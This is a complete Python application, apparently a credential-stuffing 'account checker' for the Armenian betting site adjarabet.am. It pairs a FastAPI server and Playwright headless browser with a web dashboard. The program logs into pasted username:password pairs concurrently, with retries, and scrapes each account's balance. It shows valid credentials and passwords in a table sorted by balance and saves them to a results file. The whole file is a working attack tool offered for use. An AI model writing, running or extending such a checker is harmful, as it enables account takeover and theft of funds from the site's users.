import asyncio
import json
import logging
import os
import re
from dataclasses import dataclass
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import List, Optional, Dict
from contextlib import asynccontextmanager

import aiofiles
from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, HTMLResponse
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout

# ================= CONFIG =================
CONFIG = {
    "port": int(os.getenv("PORT", 8000)),
    "host": os.getenv("HOST", "0.0.0.0"),
    "headless": os.getenv("HEADLESS", "true").lower() == "true",
    "timeout": int(os.getenv("TIMEOUT", 20000)),
    "max_retries": int(os.getenv("MAX_RETRIES", 2)),
    "concurrent_limit": int(os.getenv("CONCURRENT_LIMIT", 3)),  # զուգահեռ ակաունտներ
    "page_close_delay": 0.5,  # էջի փակման կարճ դադար
}

# ================= LOGGER =================
logging.basicConfig(
    level=getattr(logging, os.getenv("LOG_LEVEL", "INFO")),
    format="%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
logger = logging.getLogger("AdjarabetBot")

# ================= DATA MODELS =================
class AccountStatus(Enum):
    SUCCESS = "✅"
    FAILED = "❌"
    TIMEOUT = "⏰"

@dataclass
class Account:
    username: str
    password: str
    status: AccountStatus = AccountStatus.FAILED
    balance: str = "0"
    balance_value: float = 0.0
    error: str = ""
    timestamp: str = ""
    
    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now().isoformat()
    
    def to_dict(self) -> Dict:
        return {
            "username": self.username,
            "password": self.password,
            "balance": self.balance,
            "balance_value": self.balance_value,
            "status": self.status.value,
            "error": self.error[:100],
            "timestamp": self.timestamp
        }

# ================= CONNECTION MANAGER =================
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: str):
        for connection in self.active_connections[:]:
            try:
                await connection.send_text(message)
            except:
                self.disconnect(connection)

# ================= OPTIMIZED BOT =================
class Bot:
    def __init__(self):
        self.playwright = None
        self.browser = None
        self.is_running = False
        self.results: List[Account] = []
        self.semaphore = asyncio.Semaphore(CONFIG["concurrent_limit"])
    
    async def initialize(self):
        """Initialize browser once"""
        try:
            logger.info("Initializing browser...")
            self.playwright = await async_playwright().start()
            self.browser = await self.playwright.chromium.launch(
                headless=CONFIG["headless"],
                args=['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
            )
            self.is_running = True
            logger.info("Browser ready")
            return True
        except Exception as e:
            logger.error(f"Init failed: {e}")
            return False
    
    async def cleanup(self):
        self.is_running = False
        if self.browser:
            await self.browser.close()
        if self.playwright:
            await self.playwright.stop()
        logger.info("Cleanup done")
    
    def _parse_balance(self, text: str) -> tuple:
        """Parse balance text to value and clean string"""
        try:
            # Remove extra spaces and normalize
            text = text.replace(',', '').replace('₾', '').strip()
            match = re.search(r'([\d]+\.?[\d]*)', text)
            if match:
                value = float(match.group(1))
                # Format consistently
                clean = f"{value:,.2f} ₾" if value >= 0 else "0 ₾"
                return clean, value
        except:
            pass
        return "0 ₾", 0.0
    
    async def login_single(self, account: Account) -> Account:
        """Login single account with fresh context per account (fixes balance issue)"""
        context = None
        page = None
        
        try:
            # NEW CONTEXT for each account (fixes balance caching issue)
            context = await self.browser.new_context(
                viewport={'width': 1280, 'height': 720},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                ignore_https_errors=True
            )
            page = await context.new_page()
            page.set_default_timeout(CONFIG["timeout"])
            
            # Retry logic
            for attempt in range(CONFIG["max_retries"]):
                try:
                    await page.goto('https://www.adjarabet.am/hy', wait_until='domcontentloaded')
                    await asyncio.sleep(0.3)
                    
                    # Check if already logged in
                    balance_el = await page.wait_for_selector('[data-test-id="header-user-balance"]', timeout=3000)
                    if balance_el:
                        balance_text = await balance_el.inner_text()
                        clean_balance, balance_value = self._parse_balance(balance_text)
                        account.balance = clean_balance
                        account.balance_value = balance_value
                        account.status = AccountStatus.SUCCESS
                        logger.info(f"✅ {account.username} | {clean_balance}")
                        return account
                except PlaywrightTimeout:
                    pass
                
                # Try login
                try:
                    await page.wait_for_selector('input[name="userIdentifier"]', timeout=8000)
                    await page.fill('input[name="userIdentifier"]', account.username)
                    await asyncio.sleep(0.2)
                    await page.fill('input[type="password"]', account.password)
                    await asyncio.sleep(0.2)
                    await page.click('[data-test-id="header-login-button"]')
                    
                    # Wait for balance
                    balance_el = await page.wait_for_selector(
                        '[data-test-id="header-user-balance"]', 
                        timeout=12000
                    )
                    
                    balance_text = await balance_el.inner_text()
                    clean_balance, balance_value = self._parse_balance(balance_text)
                    account.balance = clean_balance
                    account.balance_value = balance_value
                    account.status = AccountStatus.SUCCESS
                    logger.info(f"✅ {account.username} | {clean_balance}")
                    return account
                    
                except PlaywrightTimeout:
                    if attempt == CONFIG["max_retries"] - 1:
                        account.status = AccountStatus.TIMEOUT
                        account.error = "Login timeout"
                        logger.warning(f"⏰ {account.username} - timeout")
                    else:
                        await asyncio.sleep(1)
                        continue
                    
            return account
            
        except Exception as e:
            account.status = AccountStatus.FAILED
            account.error = str(e)[:80]
            logger.error(f"❌ {account.username}: {str(e)[:60]}")
            return account
            
        finally:
            # Clean up
            if page:
                try:
                    await page.close()
                except:
                    pass
            if context:
                try:
                    await context.close()
                except:
                    pass
            await asyncio.sleep(CONFIG["page_close_delay"])
    
    async def process_accounts(self, accounts: List[Account], manager: ConnectionManager):
        """Process accounts concurrently with semaphore"""
        self.manager = manager
        self.results = []
        total = len(accounts)
        
        logger.info(f"Processing {total} accounts (concurrent={CONFIG['concurrent_limit']})")
        await manager.broadcast(f"STATUS:started")
        await manager.broadcast(f"PROGRESS:0/{total}")
        
        async def process_one(account: Account, idx: int):
            async with self.semaphore:
                result = await self.login_single(account)
                self.results.append(result)
                await manager.broadcast(f"RESULT:{json.dumps(result.to_dict())}")
                await manager.broadcast(f"PROGRESS:{idx}/{total}")
                return result
        
        # Process with concurrency control
        tasks = [process_one(acc, i+1) for i, acc in enumerate(accounts)]
        await asyncio.gather(*tasks)
        
        # Save results
        await self._save_results()
        
        # Summary
        successful = sum(1 for r in self.results if r.status == AccountStatus.SUCCESS)
        rate = (successful / total * 100) if total > 0 else 0
        await manager.broadcast(f"SUMMARY:{successful}/{total}:{rate:.1f}")
        await manager.broadcast("STATUS:stopped")
        
        logger.info(f"Done: {successful}/{total} ({rate:.1f}%)")
    
    async def _save_results(self):
        try:
            Path("results").mkdir(exist_ok=True)
            data = [r.to_dict() for r in self.results]
            async with aiofiles.open("results/results.json", "w", encoding="utf-8") as f:
                await f.write(json.dumps(data, indent=2, ensure_ascii=False))
        except Exception as e:
            logger.error(f"Save failed: {e}")
    
    async def get_results(self) -> List[Dict]:
        if self.results:
            return [r.to_dict() for r in self.results]
        try:
            if Path("results/results.json").exists():
                async with aiofiles.open("results/results.json", "r", encoding="utf-8") as f:
                    return json.loads(await f.read())
        except:
            pass
        return []

# ================= FASTAPI APP =================
manager = ConnectionManager()
bot = Bot()
processing_task: Optional[asyncio.Task] = None

# HTML UI (minified but functional)
HTML_UI = '''<!DOCTYPE html>
<html lang="hy">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adjarabet Bot | Pro</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0e1a; color: #e4e6eb; font-family: 'Inter', sans-serif; padding: 20px; }
        .container { max-width: 1600px; margin: 0 auto; }
        .header { background: linear-gradient(135deg, #161b22, #0d1117); border-radius: 20px; padding: 20px 30px; margin-bottom: 24px; border: 1px solid #30363d; }
        .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 24px; }
        .stat-card { background: #161b22; border-radius: 16px; padding: 20px; border: 1px solid #30363d; cursor: pointer; transition: 0.2s; }
        .stat-card:hover { transform: translateY(-3px); border-color: #58a6ff; }
        .stat-number { font-size: 36px; font-weight: 800; background: linear-gradient(135deg, #fff, #58a6ff); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .main-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 24px; }
        .card { background: #161b22; border-radius: 20px; border: 1px solid #30363d; overflow: hidden; }
        .card-header { padding: 18px 24px; background: #0d1117; border-bottom: 1px solid #30363d; }
        .card-header i { color: #58a6ff; margin-right: 10px; }
        .accounts-input { width: 100%; min-height: 280px; background: #0d1117; border: 1px solid #30363d; border-radius: 12px; padding: 16px; color: #e4e6eb; font-family: monospace; resize: vertical; }
        .btn { padding: 12px 24px; border: none; border-radius: 12px; font-weight: 600; cursor: pointer; transition: 0.2s; margin-right: 10px; }
        .btn-primary { background: #238636; color: white; }
        .btn-danger { background: #da3633; color: white; }
        .btn-secondary { background: #6e7681; color: white; }
        .terminal { background: #010409; border-radius: 12px; height: 350px; overflow-y: auto; padding: 16px; font-family: monospace; font-size: 12px; }
        .terminal-line { padding: 4px 0; border-bottom: 1px solid #21262d; }
        .table-container { max-height: 450px; overflow-y: auto; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 12px 16px; text-align: left; border-bottom: 1px solid #21262d; }
        th { background: #0d1117; cursor: pointer; position: sticky; top: 0; }
        th:hover { color: #58a6ff; }
        .balance-positive { color: #3fb950; font-weight: bold; }
        .balance-zero { color: #f85149; }
        .filter-btn { padding: 6px 16px; background: #21262d; border: none; border-radius: 20px; color: #8b949e; cursor: pointer; margin: 0 5px; }
        .filter-btn.active { background: #58a6ff; color: white; }
        .progress-bar { height: 4px; background: #30363d; border-radius: 2px; overflow: hidden; margin-top: 10px; }
        .progress-fill { height: 100%; background: #3fb950; width: 0%; transition: width 0.3s; }
        @media (max-width: 768px) { .main-grid { grid-template-columns: 1fr; } .stats { grid-template-columns: repeat(2, 1fr); } }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1><i class="fas fa-robot"></i> Adjarabet Bot <span style="font-size: 14px; color: #8b949e;">v12.0</span></h1>
        <p>Real-time account checker</p>
        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
    </div>

    <div class="stats">
        <div class="stat-card" onclick="setFilter('all')"><div class="stat-number" id="totalCount">0</div><div>Total</div></div>
        <div class="stat-card" onclick="setFilter('success')"><div class="stat-number" id="successCount">0</div><div>✅ Success</div></div>
        <div class="stat-card" onclick="setFilter('failed')"><div class="stat-number" id="failedCount">0</div><div>❌ Failed</div></div>
        <div class="stat-card" onclick="setFilter('timeout')"><div class="stat-number" id="timeoutCount">0</div><div>⏰ Timeout</div></div>
    </div>

    <div class="main-grid">
        <div class="card">
            <div class="card-header"><i class="fas fa-users"></i> Accounts</div>
            <div class="card-body" style="padding: 20px;">
                <textarea id="accounts" class="accounts-input" placeholder="username:password&#10;user2:pass2"></textarea>
                <div style="margin-top: 16px;">
                    <button class="btn btn-primary" onclick="startBot()"><i class="fas fa-play"></i> Start</button>
                    <button class="btn btn-danger" onclick="stopBot()"><i class="fas fa-stop"></i> Stop</button>
                    <button class="btn btn-secondary" onclick="clearAccounts()"><i class="fas fa-trash"></i> Clear</button>
                </div>
            </div>
        </div>

        <div class="card">
            <div class="card-header"><i class="fas fa-terminal"></i> Live Console</div>
            <div class="terminal" id="terminal">
                <div class="terminal-line">🚀 Bot ready</div>
                <div class="terminal-line">💡 Results appear in real-time</div>
            </div>
        </div>
    </div>

    <div class="card">
        <div class="card-header">
            <i class="fas fa-chart-line"></i> Results
            <div style="float: right;">
                <input type="text" id="searchInput" placeholder="Search..." style="padding: 6px 12px; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; color: white;">
                <button class="filter-btn active" data-filter="all" onclick="setFilter('all')">All</button>
                <button class="filter-btn" data-filter="success" onclick="setFilter('success')">✅</button>
                <button class="filter-btn" data-filter="failed" onclick="setFilter('failed')">❌</button>
                <button class="filter-btn" data-filter="timeout" onclick="setFilter('timeout')">⏰</button>
            </div>
        </div>
        <div class="table-container">
            <table>
                <thead>
                    <tr><th onclick="sortBy('status')">Status</th><th onclick="sortBy('username')">Username</th><th onclick="sortBy('password')">Password</th><th onclick="sortBy('balance')">Balance</th><th>Error</th></tr>
                </thead>
                <tbody id="resultsBody"><tr><td colspan="5" style="text-align:center;">Waiting for results...</td></tr></tbody>
            </table>
        </div>
    </div>
</div>

<script>
let ws = null, allResults = [], currentFilter = 'all', currentSort = { field: 'balance', dir: 'desc' };

function connect() {
    ws = new WebSocket(`ws://${window.location.host}/ws`);
    ws.onopen = () => addLog('🟢 Connected');
    ws.onmessage = (e) => {
        let data = e.data;
        if (data.startsWith('RESULT:')) {
            let result = JSON.parse(data.substring(7));
            updateResult(result);
            addLog(`${result.status} ${result.username} | ${result.balance}`);
        } else if (data.startsWith('PROGRESS:')) {
            let p = data.substring(9).split('/');
            document.getElementById('progressFill').style.width = (p[0]/p[1]*100)+'%';
        } else if (data.startsWith('SUMMARY:')) {
            addLog('📊 ' + data.substring(8));
        } else if (!data.startsWith('STATUS:')) {
            addLog(data);
        }
    };
    ws.onclose = () => setTimeout(connect, 3000);
}

function updateResult(r) {
    let idx = allResults.findIndex(x => x.username === r.username);
    if (idx >= 0) allResults[idx] = r;
    else allResults.push(r);
    renderResults();
    updateStats();
}

function renderResults() {
    let filtered = allResults.filter(r => currentFilter === 'all' || r.status === (currentFilter === 'success' ? '✅' : currentFilter === 'failed' ? '❌' : '⏰'));
    let search = document.getElementById('searchInput')?.value.toLowerCase() || '';
    filtered = filtered.filter(r => (r.username || '').toLowerCase().includes(search) || (r.password || '').toLowerCase().includes(search));
    filtered.sort((a,b) => {
        let av = currentSort.field === 'balance' ? (parseFloat(a.balance)||0) : (a[currentSort.field]||'').toLowerCase();
        let bv = currentSort.field === 'balance' ? (parseFloat(b.balance)||0) : (b[currentSort.field]||'').toLowerCase();
        return currentSort.dir === 'asc' ? (av > bv ? 1 : -1) : (av < bv ? 1 : -1);
    });
    document.getElementById('resultsBody').innerHTML = filtered.map(r => `<tr>
        <td style="font-size:20px">${r.status}</td>
        <td><strong style="color:#58a6ff">${escapeHtml(r.username)}</strong></td>
        <td><span style="font-family:monospace">${escapeHtml(r.password)}</span></td>
        <td class="${(parseFloat(r.balance)||0) > 0 ? 'balance-positive' : 'balance-zero'}">${r.balance || '0'}</td>
        <td style="color:#8b949e;font-size:12px">${r.error || '-'}</td>
    </tr>`).join('');
}

function updateStats() {
    document.getElementById('totalCount').innerText = allResults.length;
    document.getElementById('successCount').innerText = allResults.filter(r => r.status === '✅').length;
    document.getElementById('failedCount').innerText = allResults.filter(r => r.status === '❌').length;
    document.getElementById('timeoutCount').innerText = allResults.filter(r => r.status === '⏰').length;
}

function sortBy(field) {
    if (currentSort.field === field) currentSort.dir = currentSort.dir === 'asc' ? 'desc' : 'asc';
    else { currentSort.field = field; currentSort.dir = field === 'balance' ? 'desc' : 'asc'; }
    renderResults();
}

function setFilter(f) { currentFilter = f; document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.toggle('active', btn.dataset.filter === f)); renderResults(); }
function escapeHtml(s) { if(!s) return ''; return s.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]); }
function addLog(msg) { let term = document.getElementById('terminal'); let div = document.createElement('div'); div.className = 'terminal-line'; div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`; term.appendChild(div); div.scrollIntoView(); if(term.children.length>200) term.removeChild(term.firstChild); }
async function startBot() { let acc = document.getElementById('accounts').value; if(!acc.trim()) { addLog('❌ Enter accounts first'); return; } addLog('🚀 Starting...'); await fetch('/start', {method:'POST', body:acc}); }
async function stopBot() { addLog('⏹ Stopping...'); await fetch('/stop', {method:'POST'}); }
function clearAccounts() { document.getElementById('accounts').value = ''; addLog('🗑 Cleared'); }
connect();
setInterval(async () => { try { let r = await fetch('/results'); let d = await r.json(); if(d.length > allResults.length) { allResults = d; renderResults(); updateStats(); } } catch(e){} }, 3000);
</script>
</body>
</html>'''

@asynccontextmanager
async def lifespan(app: FastAPI):
    logger.info("=" * 40)
    logger.info("ADJARABET BOT v12.0 STARTING")
    logger.info(f"Headless: {CONFIG['headless']}, Timeout: {CONFIG['timeout']}ms, Concurrent: {CONFIG['concurrent_limit']}")
    logger.info("=" * 40)
    await bot.initialize()
    yield
    if processing_task and not processing_task.done():
        processing_task.cancel()
    await bot.cleanup()

app = FastAPI(lifespan=lifespan)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

@app.get("/")
async def root():
    return HTMLResponse(HTML_UI)

@app.post("/start")
async def start_bot(request: Request):
    global processing_task
    body = (await request.body()).decode()
    accounts = []
    for line in body.splitlines():
        if ':' in line and not line.startswith('#'):
            parts = line.strip().split(':', 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                accounts.append(Account(parts[0], parts[1]))
    if not accounts:
        return JSONResponse({"error": "No valid accounts"}, 400)
    
    if processing_task and not processing_task.done():
        processing_task.cancel()
        try:
            await processing_task
        except:
            pass
    
    processing_task = asyncio.create_task(bot.process_accounts(accounts, manager))
    return {"status": "started", "total": len(accounts)}

@app.post("/stop")
async def stop_bot():
    global processing_task
    if processing_task and not processing_task.done():
        processing_task.cancel()
    await manager.broadcast("STATUS:stopped")
    return {"status": "stopped"}

@app.get("/results")
async def get_results():
    return await bot.get_results()

@app.websocket("/ws")
async def ws_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            await asyncio.wait_for(websocket.receive_text(), timeout=30)
    except:
        manager.disconnect(websocket)

if __name__ == "__main__":
    import uvicorn
    Path("results").mkdir(exist_ok=True)
    print(f"\n🚀 Server: http://{CONFIG['host']}:{CONFIG['port']}")
    print(f"⚡ Concurrent accounts: {CONFIG['concurrent_limit']}\n")
    uvicorn.run(app, host=CONFIG["host"], port=CONFIG["port"], log_level="warning")
